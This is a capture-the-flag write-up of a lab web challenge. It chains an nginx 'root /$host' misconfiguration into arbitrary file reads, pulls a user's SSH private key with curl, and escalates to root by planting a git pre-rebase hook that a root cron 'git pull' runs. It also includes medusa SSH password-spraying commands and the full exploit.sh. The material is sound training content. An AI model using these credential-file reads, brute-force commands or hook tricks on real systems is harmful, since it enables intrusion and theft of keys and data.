# facial-recognition

[library.m0unt41n.ch/challenges/facial-recognition](https://library.m0unt41n.ch/challenges/facial-recognition) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

> _Your team was able to get access to a private service available on the Portable_
> _Ops' network, but they couldn't do anything with it, so they asked you for help._
> _They also said accessing the service using its IP produced a weird redirect._
>
> *Can you help them figure out what's on the machine and get root access on it?*
>
> *Note: This challenge requires ***light*** scanning.*

We get two endpoints exposed:

*   `http://library.m0unt41n.ch:$PORT1`
*   `ssh library.m0unt41n.ch -p $PORT2`

It is a combination of:

*   Figuring out `Host:`-based HTTP redirection
*   Finding an exposed `nginx.conf`
*   Using arbitrary-read misconfiguration in that config to pull SSH key of
    the `webapp` user
*   Finding a root cronjob doing `git pull` in user-controlled directory.
*   Exploiting that by tweaking the repository and installing arbitrary script
    as a Git hook, that is executed with next cron run.

# Getting the index page

*    Accessing the URL directly results with `File not found.`

*    Accessing with IP (e.g. `http://128.140.62.133:30301`) results with:

     ```
     HTTP/1.1 301 Moved Permanently
     Server: nginx/1.18.0 (Ubuntu)
     Date: Fri, 29 Nov 2024 17:15:19 GMT
     Content-Type: text/html
     Content-Length: 178
     Connection: keep-alive
     Location: http://facialrecognition/
     ```

*   Accessing the server in a *single* HTTP/1.1 session gets us further:

    ```
    $ telnet library.m0unt41n.ch 30301
    GET / HTTP/1.1
    Host: 128.140.62.133 
    
    HTTP/1.1 301 Moved Permanently
    ```

    Then, in the same session:

    ```
    GET http://facialrecognition/ HTTP/1.1
    Host: facialrecognition

    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Sat, 30 Nov 2024 15:39:25 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive

    1e3f

    <html>
    (...)
    ```

    ... gets us stuff. Note that `1e3f` is from chunked encoding (as well as
    `0` that ends the response)

*   This can be simplified as
    `curl -v -H "Host: facialrecognition" http://library.m0unt41n.ch:30301`

*   To facilitate further debugging, I added the IP to `/etc/hosts`, which
    allows direct calls:

    ```h
    128.140.62.133   facialrecognition
    ```

    With that, we can open http://facialrecognition:30301/ in the browser.
    That results in an index page with images, that we can download for
    further inspection.

# "Light scanning"

## Filenames as password (FAIL)

With the mention of _"requires light scanning"_, my first thought was to try
using the filenames as password. I generated few variants:

```python
import glob
import re

# List of files
FILES = [ i.split("/")[2] for i in glob.glob("website/resources/*") ]
# Split extensions
FILES_NOEXT = [ i.split(".")[0] for i in FILES ]
# Parts in brackets
IN_BRACKETS = [ re.search(r'\((.*)\)', i).group(1) for i in FILES_NOEXT if "(" in i ]
# Strip parts in brackets
BASE_NAMES = [ re.sub(r'_\(.*', '', i) for i in FILES_NOEXT ]
# Split to individual words
SINGLE_WORDS = " ".join([ re.sub(r'[_()]', " ", i) for i in FILES_NOEXT ]).split(" ")
# Combine all these
WORDS = FILES + FILES_NOEXT + IN_BRACKETS + BASE_NAMES + SINGLE_WORDS
# Add all variants: replace _ with spaces, all-lower, first-caps
WORDS = WORDS + [ re.sub(r'_', " ", i) for i in WORDS]
WORDS = WORDS + [ i.lower() for i in WORDS ]
WORDS = WORDS + [ i.capitalize() for i in WORDS ]
# sort|uniq
WORDS = sorted(set(WORDS))
print("\n".join(WORDS))
```

That resulted in ~2200 words, which still counts as "light" in my books &#128578;
Then, I tried them:

```bash
medusa -h library.m0unt41n.ch -n 31847 -u root -P /data/wordlists/10k-most-common.txt -M ssh -t 5
medusa -h library.m0unt41n.ch -n 31847 -u facialrecognition -P /data/wordlists/10k-most-common.txt -M ssh -t 5
medusa -h library.m0unt41n.ch -n 31847 -u git -P /data/wordlists/10k-most-common.txt -M ssh -t 5
medusa -h library.m0unt41n.ch -n 31847 -u snake -P /data/wordlists/10k-most-common.txt -M ssh -t 5
```

But none of that worked.

## Image metadata / stego (FAIL)

First of all, not all these files are actually PNGs

```bash
for F in *.png; do file $F | grep -q "JPEG image data" && mv "$F" "${F/.png/.jpg}" ; done
for F in *.png; do file $F | grep -q "GIF image data" && mv "$F" "${F/.png/.gif}" ; done
```

I tried looking for metadata

```bash
exiftool -if '$xmp or $exif or $iptc' -ee3 -U -G3:1 -api requestall=3 -api largefilesupport  * | grep -Ev '^\[(ExifTool|System|File)'
```

I found some weird things (UUIDs, Creator data, XMP blobs), but nothing helped.

```bash
for F in ../*.png; do ~/.local/share/gem/ruby/gems/zsteg-0.2.13/bin/zsteg -a $F 2>&1 | dos2unix >$(basename $F).steg & done
```

## Scanning WWW (SUCCESS)

The headers we got above mention that the site is served by Nginx.
It turns out that the config is left in the open and we can get it with
`curl -v -H "Host: facialrecognition" http://library.m0unt41n.ch:30301/nginx.conf`:

```js
worker_processes 1;
daemon off;
user webapp webapp;

events {
    worker_connections 16;
}

http {
    include /etc/nginx/mime.types;
    server {
        listen 80;
        server_name facialrecognition;
        if ($host ~* "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$") {
            return 301 $scheme://facialrecognition$request_uri;
        }
        root /$host/webapp;
        index index.php;
        location ~ \.php$ {
            include fastcgi_params;
            fastcgi_pass unix:/run/php/php8.1-fpm.sock;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param SCRIPT_NAME $fastcgi_script_name;
        }
        location /resources {
            alias /$host/webapp/dataset/;
        }
        location / {
            root /$host;
            try_files $uri /index.php;
        }
    }
}
```

This has few problems, but, most importantly, `root /$host`. That enables
arbitrary file retrieval:

```bash
$ curl -v -H "Host: etc" http://library.m0unt41n.ch:30301/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
(...)
```

But not as root:

```bash
$ curl -v -H "Host: etc" http://library.m0unt41n.ch:30301/shadow
(...)
< HTTP/1.1 403 Forbidden

$ curl -v -H "Host: root" http://library.m0unt41n.ch:30301/flag.txt
(...)
< HTTP/1.1 404 Not Found
```

But it's enough to get the `webapp` user's SSH key &#128578;

```bash
$ curl -v -H "Host: home" http://library.m0unt41n.ch:30301/webapp/.ssh/id_rsa
(...)
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtRCa5JCVnUGDAG+7gWPIeLgSZyNQVQnXUgLxxWPEPrNuYygOhOVe
(...)

curl -H "Host: home" http://library.m0unt41n.ch:30301/webapp/.ssh/id_rsa >webapp.key
```

... which works:

```bash
$ ssh -p 30506 -i webapp.key webapp@library.m0unt41n.ch
The authenticity of host '[library.m0unt41n.ch]:30506 ([128.140.62.133]:30506)' can't be established.
ED25519 key fingerprint is SHA256:8ubon0Aw7NhO+4jeAXF7C8xHvrucd0hLD/7PazOi9ac.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[library.m0unt41n.ch]:30506' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

webapp@facialrecognition:~$ touch .hushlogin
webapp@facialrecognition:~$
```

# Looking around the remote server

The flag is nowhere to be seen and `/root` is locked - also the challenge
description suggests to _"get root"_.

## Basic stuff

*   SUID

    ```bash
    $ find / -perm -4000 2>/dev/null | xargs ls -l
    -rwsr-xr-x 1 root root        72712 Feb  6  2024 /usr/bin/chfn
    -rwsr-xr-x 1 root root        44808 Feb  6  2024 /usr/bin/chsh
    -rwsr-xr-x 1 root root        72072 Feb  6  2024 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root        47488 Apr  9  2024 /usr/bin/mount
    -rwsr-xr-x 1 root root        40496 Feb  6  2024 /usr/bin/newgrp
    -rwsr-xr-x 1 root root        59976 Feb  6  2024 /usr/bin/passwd
    -rwsr-xr-x 1 root root        55680 Apr  9  2024 /usr/bin/su
    -rwsr-xr-x 1 root root        35200 Apr  9  2024 /usr/bin/umount
    -rwsr-xr-- 1 root messagebus  35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    -rwsr-xr-x 1 root root       338536 Jun 26  2024 /usr/lib/openssh/ssh-keysign
    ```

*   SGID

    ```bash
    $ find / -perm -2000 2>/dev/null | xargs ls -l
    -rwxr-sr-x 1 root shadow           72184 Feb  6  2024 /usr/bin/chage
    -rwxr-sr-x 1 root crontab          39568 Mar 23  2022 /usr/bin/crontab
    -rwxr-sr-x 1 root shadow           23136 Feb  6  2024 /usr/bin/expiry
    -rwxr-sr-x 1 root _ssh            293304 Jun 26  2024 /usr/bin/ssh-agent
    -rwxr-sr-x 1 root shadow           22680 Nov 17 11:17 /usr/sbin/pam_extrausers_chkpwd
    -rwxr-sr-x 1 root shadow           26776 Nov 17 11:17 /usr/sbin/unix_chkpwd
    ```

*   Files owned by user

    ```bash
    $ find / -user webapp 2>/dev/null | egrep -v '^/(proc|dev|facialrecognition|home/webapp)'
    /var/lib/nginx/uwsgi
    /var/lib/nginx/scgi
    /var/lib/nginx/body
    /var/lib/nginx/proxy
    /var/lib/nginx/fastcgi
    /run/php/php8.1-fpm.sock
    ```

*   Files writable by user

    ```bash
    $ find / -writable 2>/dev/null | egrep -v '^/(proc|dev|facialrecognition|home/webapp)'
    /tmp
    /var/tmp
    /var/lib/nginx/uwsgi
    /var/lib/nginx/scgi
    /var/lib/nginx/body
    /var/lib/nginx/proxy
    /var/lib/nginx/fastcgi
    /var/lib/php/sessions
    /var/lock
    /usr/lib/systemd/system/hwclock.service
    /usr/lib/systemd/system/cryptdisks.service
    /usr/lib/systemd/system/rc.service
    /usr/lib/systemd/system/rcS.service
    /usr/lib/systemd/system/cryptdisks-early.service
    /usr/lib/systemd/system/x11-common.service
    /run/lock
    /run/php/php8.1-fpm.sock
    /run/shm
    ```

*   Files modified in few months before the competition

    ```bash
    $ find / -type f -newermt "2023-01-01" ! -newermt "2023-09-21" 2>/dev/null | egrep -v '^/(usr/(include|share|lib|src|bin|sbin)|var/lib/dpkg)' | xargs ls -l
    -rw-r--r-- 1 root root  389 May 30  2023 /etc/default/nginx
    -rwxr-xr-x 1 root root 4579 May 30  2023 /etc/init.d/nginx
    -rw-r--r-- 1 root root  329 May 30  2023 /etc/logrotate.d/nginx
    -rw-r--r-- 1 root root  111 Sep 11  2023 /etc/magic
    -rw-r--r-- 1 root root  111 Sep 11  2023 /etc/magic.mime
    -rw-r--r-- 1 root root 1125 May 30  2023 /etc/nginx/fastcgi.conf
    -rw-r--r-- 1 root root 1055 May 30  2023 /etc/nginx/fastcgi_params
    -rw-r--r-- 1 root root 2837 May 30  2023 /etc/nginx/koi-utf
    -rw-r--r-- 1 root root 2223 May 30  2023 /etc/nginx/koi-win
    -rw-r--r-- 1 root root 3957 May 30  2023 /etc/nginx/mime.types
    -rw-r--r-- 1 root root  180 May 30  2023 /etc/nginx/proxy_params
    -rw-r--r-- 1 root root  636 May 30  2023 /etc/nginx/scgi_params
    -rw-r--r-- 1 root root 2412 May 30  2023 /etc/nginx/sites-available/default
    -rw-r--r-- 1 root root  423 May 30  2023 /etc/nginx/snippets/fastcgi-php.conf
    -rw-r--r-- 1 root root  217 May 30  2023 /etc/nginx/snippets/snakeoil.conf
    -rw-r--r-- 1 root root  664 May 30  2023 /etc/nginx/uwsgi_params
    -rw-r--r-- 1 root root 3071 May 30  2023 /etc/nginx/win-utf
    -rw-r--r-- 1 root root  374 May 30  2023 /etc/ufw/applications.d/nginx
    ```

## The app

As suggested by `root` directives in `nginx.conf`, the app is indeed hosted in
`/facialrecognition/webapp`. The `index.php` there does some fun stuff at the
beginning, but otherwise it is just listing the images:

```html
<?php
//backup stuff
if (shell_exec("diff /facialrecognition/webapp/dataset/ /home/webapp/dataset/") != NULL){
    shell_exec("cp /facialrecognition/webapp/dataset/* /home/webapp/dataset/");
};
?>
<!DOCTYPE html>
<html>
<head>
    <style>
    </style>
</head>
<body>
<h1 style="color: red">TOP SECRET</h1>
    <h1>Facial Recognition Dataset</h1>
    <p>You just accessed Portable Ops' very secret dataset used for facial recognition. Authorized eyes only. This dataset is pulled every minute directly from the facial recognition git repository.</p>
    <div class="image-container">
        <?php
        $myfiles = scandir("/facialrecognition/webapp/dataset/");
        $myfiles = array_slice($myfiles, 2);
        shuffle($myfiles); 
        for ($i = 0; $i < count($myfiles); $i++) {
            $myfiles[$i] = substr($myfiles[$i], 0, -4);
            echo "<img src='/resources/" . $myfiles[$i] . ".png'>";
        }
        ?>
    </div>
</body>
</html>
```

## The processes

```bash
$ ps auxwww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2892   972 ?        Ss   08:56   0:00 /bin/sh -c echo 127.0.0.1 facialrecognition >> /etc/hosts && cron -f & /usr/sbin/sshd -D & service php8.1-fpm start && service nginx start
root           8  0.0  0.0   3888  2532 ?        S    08:56   0:00 cron -f
root           9  0.0  0.0  15436  9632 ?        S    08:56   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root          19  0.0  0.0 199720  5788 ?        Ss   08:56   0:00 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
webapp        20  0.0  0.0 200028 10988 ?        S    08:56   0:00 php-fpm: pool www
webapp        21  0.0  0.0 200028 12380 ?        S    08:56   0:00 php-fpm: pool www
root          22  0.0  0.0   2892  1748 ?        S    08:56   0:00 /bin/sh /etc/init.d/nginx start
root          33  0.0  0.0  10228  6716 ?        S    08:56   0:00 nginx: master process /usr/sbin/nginx
webapp        34  0.0  0.0  10536  3056 ?        S    08:56   0:00 nginx: worker process
root         630  0.0  0.0  16892 10920 ?        Ss   09:32   0:00 sshd: webapp [priv]
webapp       641  0.0  0.0  17172  8048 ?        S    09:32   0:00 sshd: webapp@pts/0
webapp       642  0.0  0.0   5048  4100 pts/0    Ss   09:32   0:00 -bash
webapp       706  0.0  0.0   7484  1608 pts/0    R+   09:36   0:00 ps auxwww
```

So, both PHP and Nginx are running with privileges dropped. There is a cron
running - and, scanning through various configs, following seem relevant:

*    `/etc/cron.d/datasetUpdate`: `* * * * * root cd /facialrecognition/ && git pull`
*    `/etc/cron.d/php`: `09,39 * * * * root [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi`

Main thing that stands out in all above is that there is a `git pull` executed
as `root`, inside `/facialrecognition` directory. That directory is owned by
`webapp:webapp` and there is indeed a Git repo there:

```ini
$ cat /facialrecognition/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/portableops/facialrecognition.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Which means that we can try to use Git hooks, to get the `git pull` to execute
arbitrary code.

# Exploiting Git hooks

The overall idea, is to cause enough of a diff in the repo, to make `git merge`
a non-trivial operation, triggering the `pre-rebase` hook. But
_I could not get this to work_ &#128577;. It worked reproducibly locally (incl. for
`git pull` as root!), but remotely, only for `webapp` user (including from
cron). The `git pull` **did** start, but it only created an empty `FETCH_HEAD`.

One of the many hints I found is that there could be a restriction for where
the _local_ repositories are allowed, in user's (i.e. root's) global git
config. The next logical step was to create my own fork of the repo on GitHub,
make a change there and patch it in the `.git/config`.

But, looking at
[github.com/portableops/facialrecognition](https://github.com/portableops/facialrecognition)
I realized... that I
[was not the only one](https://github.com/portableops/facialrecognition/forks)
with this idea &#128512; There is a
[clone by cfi2017](https://github.com/cfi2017/facialrecognition) - incidentally,
created on the same day (2024-09-24) that he solved this challenge &#128512; It has a
[single extra commit](https://github.com/cfi2017/facialrecognition/commit/91b95b2dbae56f556d52fd8a084499e0470bbde1)
which adds a dummy `a` file.

From here, the `exploit.sh` was:

```bash
#!/bin/bash

# cd /tmp/facialrecognition
cd /facialrecognition
git config pull.rebase true
git config user.email me@example.org
git config user.name me

# Cleanup the permissions diff
git restore nginx.conf
# Use cfi2017's repo
sed -i 's/portableops/cfi2017/' .git/config
# ... but create a local commit conflicting with it
echo "different a" >a
git add a
git commit -m "different a"

# Prepare the hook
echo -e "#!/bin/sh\ntar cf /tmp/root.tar /root" >.git/hooks/pre-rebase
chmod a+x .git/hooks/pre-rebase
```

Then:

*   Start a fresh instance at
    [library.m0unt41n.ch/challenges/facial-recognition](https://library.m0unt41n.ch/challenges/facial-recognition)
    <br>(ideally shortly after `:00`, to get local repo in pristine state,
    before the first `git pull` attempt). Write down the new `PORT`.
*   `scp -P $PORT -i webapp.key exploit.sh webapp@library.m0unt41n.ch`
*   `ssh -p $PORT -i webapp.key webapp@library.m0unt41n.ch`
*   `sh exploit.sh`

Few moments later...

```bash
$ ls -l /tmp
-rw-r--r-- 1 root root 20480 Feb 23 18:46 root.tar

$ tar tvf /tmp/root.tar
drwx------ root/root         0 2025-02-14 23:15 root/
-rw-r--r-- root/root       161 2019-07-09 12:05 root/.profile
-rw-r--r-- root/root      3106 2021-10-15 12:06 root/.bashrc
-rw-r--r-- root/root        39 2025-02-14 23:15 root/.gitconfig
-rw-r--r-- root/root        36 2025-02-14 23:15 root/flag.txt

$ tar xOf /tmp/root.tar root/flag.txt
shc2023{lmao_git_h00ks_cfeae2d2941}
```

BTW, the `.gitconfig` explains why my attempts to use local repos were futile:

```bash
$ tar xOf ~/work/ctf/shc/facial-recognition/root.tar root/.gitconfig
[safe]
	directory = /facialrecognition
```

Q.E.D. &#128578;

---

## `shc2023{lmao_git_h00ks_cfeae2d2941}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
